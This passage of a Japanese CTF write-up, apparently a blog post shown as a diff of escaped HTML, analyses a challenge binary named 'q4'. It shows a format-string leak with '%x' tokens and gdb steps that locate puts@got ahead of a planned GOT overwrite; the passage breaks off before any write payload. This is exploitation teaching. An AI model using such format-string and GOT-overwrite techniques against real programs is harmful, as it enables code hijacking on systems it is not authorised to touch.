+ 804868d:       84 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %al,%al                      &lt;span class=&quot;c&quot;&gt;#   ↓ goto LOOP の処理を避けることは出来ない&lt;/span&gt;
+ 804868f:       75 89                   jne    804861a &amp;lt;main+0x66&amp;gt;          &lt;span class=&quot;c&quot;&gt;# goto LOOP&lt;/span&gt;
+                                                                            &lt;span class=&quot;c&quot;&gt;# ↓↓↓↓ flag.txt を読み込んで表示する処理 ↓↓↓↓&lt;/span&gt;
+ 8048691:       c7 44 24 04 e6 87 04    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487e6&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;         &lt;span class=&quot;c&quot;&gt;#   引数2 &quot;flag.txt&quot;&lt;/span&gt;
+ 8048698:       08
+ 8048699:       c7 04 24 e8 87 04 08    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487e8&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;            &lt;span class=&quot;c&quot;&gt;#   引数1 &quot;r&quot;&lt;/span&gt;
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &amp;lt;fopen@plt&amp;gt;          &lt;span class=&quot;c&quot;&gt;# fp = fopen(&quot;flag.txt&quot;, &quot;r&quot;)&lt;/span&gt;
+ 80486a5:       89 84 24 1c 04 00 00    mov    %eax,0x41c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486ac:       8b 84 24 1c 04 00 00    mov    0x41c&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax             &lt;span class=&quot;c&quot;&gt;#   引数3 FILE* fp&lt;/span&gt;
+ 80486b3:       89 44 24 08             mov    %eax,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486b7:       c7 44 24 04 00 04 00    movl   &lt;span class=&quot;nv&quot;&gt;$0x400&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;#   引数2 0x400 = 1024&lt;/span&gt;
+ 80486be:       00
+ 80486bf:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 80486c3:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &amp;lt;fgets@plt&amp;gt;          &lt;span class=&quot;c&quot;&gt;# fgets(input, 1024, fp)&lt;/span&gt;
+ 80486cb:       8d 44 24 18             lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax              &lt;span class=&quot;c&quot;&gt;#   引数1 char input[400]&lt;/span&gt;
+ 80486cf:       89 04 24                mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 80486d2:       e8 &lt;span class=&quot;nb&quot;&gt;dd &lt;/span&gt;fd ff ff          call   80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;         &lt;span class=&quot;c&quot;&gt;# printf(input)&lt;/span&gt;
+ 80486d7:       b8 00 00 00 00          mov    &lt;span class=&quot;nv&quot;&gt;$0x0&lt;/span&gt;,%eax
+                                                                            &lt;span class=&quot;c&quot;&gt;# ↑↑↑↑ ------------------------------- ↑↑↑↑&lt;/span&gt;
+
+ 80486dc:       c9                      leave                       &lt;span class=&quot;c&quot;&gt;# END: # &lt;/span&gt;
+ 80486dd:       c3                      ret
+ 80486de:       90                      nop
+ 80486df:       90                      nop
+
+080486e0 &amp;lt;__libc_csu_fini&amp;gt;:
+ ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;canflag0x418&quot;&gt;canFlag(0x418)&lt;/h4&gt;
+&lt;p&gt;　まず注目すべき点は、どのような入力をしてもフラグを表示してくれそうにないということである。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 8048681:       8b 84 24 18 04 00 00    mov    0x418&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax     &lt;span class=&quot;c&quot;&gt;# FLAG: # if(canFlag == 1)&lt;/span&gt;
+ 8048688:       85 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %eax,%eax                    &lt;span class=&quot;c&quot;&gt;#   ↓ canFlag(0x418) は 1 に初期化されている&lt;/span&gt;
+ 804868a:       0f 95 c0                setne  %al                          &lt;span class=&quot;c&quot;&gt;#   ↓ 従って必ず式の結果は true&lt;/span&gt;
+ 804868d:       84 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %al,%al                      &lt;span class=&quot;c&quot;&gt;#   ↓ goto LOOP の処理を避けることは出来ない&lt;/span&gt;
+ 804868f:       75 89                   jne    804861a &amp;lt;main+0x66&amp;gt;          &lt;span class=&quot;c&quot;&gt;# goto LOOP&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　上記4行で行っているのは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if(canFlag == 1)&lt;/code&gt; に相当する処理であり、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;canFlag(0x418)&lt;/code&gt; 変数の値は&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 804860d:       c7 84 24 18 04 00 00    movl   &lt;span class=&quot;nv&quot;&gt;$0x1&lt;/span&gt;,0x418&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;             &lt;span class=&quot;c&quot;&gt;# int canFlag = 1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　の行で &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt; に初期化されている（ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;804860d&lt;/code&gt; アドレスを参考に逆アセンブル結果を見て欲しい。 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LOOP&lt;/code&gt; ラベルの直前だ）&lt;/p&gt;
+
+&lt;p&gt;　従って、正常な処理フローではこのif文を抜けられず、その後に続く &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag.txt&lt;/code&gt; を &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fopen()&lt;/code&gt; で読み出して &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf()&lt;/code&gt; で表示する処理に到達できないことが分かる。&lt;/p&gt;
+
+&lt;p&gt;　これこそが、この問題が提示している&lt;strong&gt;謎&lt;/strong&gt;である。&lt;/p&gt;
+
+&lt;h3 id=&quot;fsbformat-string-bug&quot;&gt;FSB(Format String Bug)&lt;/h3&gt;
+&lt;p&gt;　謎を解く鍵は、このプログラムの持つ脆弱性 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Format String Bug&lt;/code&gt; だ。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 80485fc:       e8 b3 fe ff ff          call   80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;         &lt;span class=&quot;c&quot;&gt;# printf(input)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　この行こそ脆弱性である。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSB(Format String Bug)&lt;/code&gt; は、書式指定可能な関数においてメモリの内容を読み・書きが可能な脆弱性である。今回は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 関数であり、正しく使えば何も問題はないのだが。&lt;/p&gt;
+
+&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 脆弱性なし&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;// 脆弱性あり&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printf&lt;/code&gt; 関数の書き方一つで脆弱性を持ってしまう。&lt;/p&gt;
+
+&lt;p&gt;　実際に入力して脆弱性を確認してみよう。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./q4
+What&lt;span class=&quot;s1&quot;&gt;'s your name?
+AAAA,%x,%x,%x,%x,%x,%x,%x
+Hi, AAAA,400,f7cdc580,ffb69918,6,0,41414141,252c7825
+
+Do you want the flag?
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt; は16進数で値を表示する書式トークンであり、見事にメモリの読み出しに成功している。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AAAA&lt;/code&gt; と言う文字列は16進数表現だと &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;41414141&lt;/code&gt; になり、丁度6番目の &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%x&lt;/code&gt; に値が出現している。&lt;/p&gt;
+
+&lt;p&gt;　このように、書式トークンが機能することこそが脆弱性なのである。&lt;/p&gt;
+
+&lt;h4 id=&quot;余談&quot;&gt;余談&lt;/h4&gt;
+&lt;p&gt;　逆アセンブル結果から、main関数で使われる変数の合計は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x420 byte&lt;/code&gt; であることが分かる。&lt;/p&gt;
+
+&lt;p&gt;　注意深く変数を拾っていき、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hi, AAAA,400,f7cdc580,ffb69918,6,0,41414141,252c7825&lt;/code&gt; という読み出し結果を合わせると、以下のようになっているのが分かる。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#   esp + [0x0  ~ 0x3]    --- 引数1 : input&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x4  ~ 0x7]    --- 引数2 : 0x400&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x8  ~ 0xB]    --- 引数3 : stdin : f7cdc580&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0xC  ~ 0xF]    --- ？？？？？ : ffb69918&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x10 ~ 0x13]   --- ？？？？？ : 6&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x14 ~ 0x17]   --- ？？？？？ : 0&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x18 ~ 0x417]  --- char input[400] : 41414141, 252c7825, ...&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x418 ~ 0x41B] --- int canShowFlag = 1 // 4byte&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#   esp + [0x41C ~ 0x41F] --- FILE* fp            // ポインタのため 4byte&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　読み出し結果は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp + 0x4&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp + 0x19&lt;/code&gt; までを表示しているわけである。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp + 0x0&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp +0xB&lt;/code&gt; までは引数として使われているのだが、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp + 0xC&lt;/code&gt; ~ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;esp + 0x17&lt;/code&gt; の領域が何に使われているのかは最後まで不明だった。気になる人は調べてみて欲しい。&lt;/p&gt;
+
+&lt;p&gt;　余談は以上である。&lt;/p&gt;
+
+&lt;h3 id=&quot;攻撃方法の立案&quot;&gt;攻撃方法の立案&lt;/h3&gt;
+
+&lt;p&gt;　さて、セキュリティと脆弱性について確認した。これで攻撃方法を確定する。今回は、&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;セキュリティ: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no RELRO&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;脆弱性: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSB(Format String Bug)&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　という特徴を利用しようと思う。題して、「&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Format String Bug&lt;/code&gt; を利用した &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT overwrite&lt;/code&gt;」。&lt;/p&gt;
+
+&lt;p&gt;　※ GOT(Global Offset Table)&lt;/p&gt;
+
+&lt;h3 id=&quot;下準備1-書き換え対象アドレス&quot;&gt;下準備1 書き換え対象アドレス&lt;/h3&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSB&lt;/code&gt; を利用すると任意のメモリの値を書き換えることも出来る。これには &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%hc&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%hnn&lt;/code&gt; といった書式トークンを使う（それぞれ 4byte, 2byte, 1byte の書き込みを実現する）。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no RELRO&lt;/code&gt; であるため、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FSB&lt;/code&gt; を使って GOT のリターンアドレスを書き換えることが出来る。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GOT overwrite&lt;/code&gt; の対象となるリターンアドレスだが、今回は &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; 関数のリターンアドレスにしよう。これからそのアドレスを確認する。&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;q4@eceec62b961b ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; q4
+Reading symbols from q4...&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no debugging symbols found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;...done.
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas main
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;main:
+   0x080485b4 &amp;lt;+0&amp;gt;:     push   %ebp
+   0x080485b5 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
+   0x080485b7 &amp;lt;+3&amp;gt;:     and    &lt;span class=&quot;nv&quot;&gt;$0xfffffff0&lt;/span&gt;,%esp
+   0x080485ba &amp;lt;+6&amp;gt;:     sub    &lt;span class=&quot;nv&quot;&gt;$0x420&lt;/span&gt;,%esp
+   0x080485c0 &amp;lt;+12&amp;gt;:    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487a4&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x080485c7 &amp;lt;+19&amp;gt;:    call   0x80484c4 &amp;lt;puts@plt&amp;gt;     &lt;span class=&quot;c&quot;&gt;# breakpoint 1&lt;/span&gt;
+   0x080485cc &amp;lt;+24&amp;gt;:    mov    0x8049a04,%eax
+   0x080485d1 &amp;lt;+29&amp;gt;:    mov    %eax,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x080485d5 &amp;lt;+33&amp;gt;:    movl   &lt;span class=&quot;nv&quot;&gt;$0x400&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x080485dd &amp;lt;+41&amp;gt;:    lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+   0x080485e1 &amp;lt;+45&amp;gt;:    mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x080485e4 &amp;lt;+48&amp;gt;:    call   0x8048484 &amp;lt;fgets@plt&amp;gt;
+   0x080485e9 &amp;lt;+53&amp;gt;:    movl   &lt;span class=&quot;nv&quot;&gt;$0x80487b6&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x080485f0 &amp;lt;+60&amp;gt;:    call   0x80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
+   0x080485f5 &amp;lt;+65&amp;gt;:    lea    0x18&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax
+   0x080485f9 &amp;lt;+69&amp;gt;:    mov    %eax,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x080485fc &amp;lt;+72&amp;gt;:    call   0x80484b4 &amp;lt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;@plt&amp;gt;
+   0x08048601 &amp;lt;+77&amp;gt;:    movl   &lt;span class=&quot;nv&quot;&gt;$0xa&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x08048608 &amp;lt;+84&amp;gt;:    call   0x8048474 &amp;lt;putchar@plt&amp;gt;
+   0x0804860d &amp;lt;+89&amp;gt;:    movl   &lt;span class=&quot;nv&quot;&gt;$0x1&lt;/span&gt;,0x418&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x08048618 &amp;lt;+100&amp;gt;:   jmp    0x8048681 &amp;lt;main+205&amp;gt;
+   0x0804861a &amp;lt;+102&amp;gt;:   movl   &lt;span class=&quot;nv&quot;&gt;$0x80487bb&lt;/span&gt;,&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x08048621 &amp;lt;+109&amp;gt;:   call   0x80484c4 &amp;lt;puts@plt&amp;gt;     &lt;span class=&quot;c&quot;&gt;# breakpoint 2&lt;/span&gt;
+   0x08048626 &amp;lt;+114&amp;gt;:   mov    0x8049a04,%eax
+   0x0804862b &amp;lt;+119&amp;gt;:   mov    %eax,0x8&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+   0x0804862f &amp;lt;+123&amp;gt;:   movl   &lt;span class=&quot;nv&quot;&gt;$0x400&lt;/span&gt;,0x4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;--Type&lt;/span&gt; &amp;lt;RET&amp;gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more, q to quit, c to &lt;span class=&quot;k&quot;&gt;continue &lt;/span&gt;without paging--q
+Quit
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;main+19
+Breakpoint 1 at 0x80485c7
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; b &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;main+109
+Breakpoint 2 at 0x8048621
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
+Starting program: /home/q4/q4
+warning: Error disabling address space randomization: Operation not permitted
+Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.i686
+warning: Loadable section &lt;span class=&quot;s2&quot;&gt;&quot;.note.gnu.property&quot;&lt;/span&gt; outside of ELF segments
+warning: Loadable section &lt;span class=&quot;s2&quot;&gt;&quot;.note.gnu.property&quot;&lt;/span&gt; outside of ELF segments
+
+Breakpoint 1, 0x080485c7 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+Missing separate debuginfos, use: yum debuginfo-install libgcc-8.3.1-5.1.el8.i686 libstdc++-8.3.1-5.1.el8.i686
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; disas 0x80484c4
+Dump of assembler code &lt;span class=&quot;k&quot;&gt;for function &lt;/span&gt;puts@plt:
+   0x080484c4 &amp;lt;+0&amp;gt;:     jmp    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x80499f4       &lt;span class=&quot;c&quot;&gt;# GOTアドレス&lt;/span&gt;
+   0x080484ca &amp;lt;+6&amp;gt;:     push   &lt;span class=&quot;nv&quot;&gt;$0x30&lt;/span&gt;
+   0x080484cf &amp;lt;+11&amp;gt;:    jmp    0x8048454
+End of assembler dump.
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/xw 0x80499f4                            &lt;span class=&quot;c&quot;&gt;# 1回目&lt;/span&gt;
+0x80499f4 &amp;lt;puts@got.plt&amp;gt;:       0x080484ca  
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; c
+Continuing.
+What&lt;span class=&quot;s1&quot;&gt;'s your name?
+hi  
+Hi, hi
+
+
+Breakpoint 2, 0x08048621 in main ()
+(gdb) x/xw 0x80499f4
+0x80499f4 &amp;lt;puts@got.plt&amp;gt;:       0xf7b25140      # 2回目(lazy binding)
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; 関数二つに &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;breakpoint&lt;/code&gt; を打つ&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disas 0x80484c4&lt;/code&gt; によって &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; 関数を逆アセンブル&lt;/li&gt;
+  &lt;li&gt;今回書き換えたいのは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80499f4&lt;/code&gt; である
+    &lt;ol&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x080484c4 &amp;lt;+0&amp;gt;:     jmp    *0x80499f4&lt;/code&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/xw 0x80499f4&lt;/code&gt; で値を確認
+    &lt;ol&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80499f4 &amp;lt;puts@got.plt&amp;gt;:       0x080484ca&lt;/code&gt;&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+  &lt;li&gt;進める&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x/xw 0x80499f4&lt;/code&gt; で値を確認（2回目）
+    &lt;ol&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80499f4 &amp;lt;puts@got.plt&amp;gt;:       0xf7b25140&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no RELRO&lt;/code&gt; は遅延バインディングする。確かに2回目のアドレスが変わっており、遅延バインディングされている。&lt;/li&gt;
+    &lt;/ol&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;　以上の結果から、今回書き換える対象となる GOT のメモリアドレスは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x80499f4&lt;/code&gt; で間違いない。&lt;/p&gt;
+
+&lt;p&gt;　書き換えることで、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; 関数を呼び出した時に&lt;strong&gt;任意のアドレスにジャンプ&lt;/strong&gt;させることが出来る。&lt;/p&gt;
+
+&lt;h3 id=&quot;下準備2-ジャンプ先アドレス&quot;&gt;下準備2 ジャンプ先アドレス&lt;/h3&gt;
+
+&lt;p&gt;　ジャンプ先であるが、&lt;/p&gt;
+
+&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; 8048681:       8b 84 24 18 04 00 00    mov    0x418&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;%esp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,%eax     &lt;span class=&quot;c&quot;&gt;# FLAG: # if(canFlag == 1)&lt;/span&gt;
+ 8048688:       85 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %eax,%eax                    &lt;span class=&quot;c&quot;&gt;#   ↓ canFlag(0x418) は 1 に初期化されている&lt;/span&gt;
+ 804868a:       0f 95 c0                setne  %al                          &lt;span class=&quot;c&quot;&gt;#   ↓ 従って必ず式の結果は true&lt;/span&gt;
+ 804868d:       84 c0                   &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;   %al,%al                      &lt;span class=&quot;c&quot;&gt;#   ↓ goto LOOP の処理を避けることは出来ない&lt;/span&gt;
+ 804868f:       75 89                   jne    804861a &amp;lt;main+0x66&amp;gt;          &lt;span class=&quot;c&quot;&gt;# goto LOOP&lt;/span&gt;
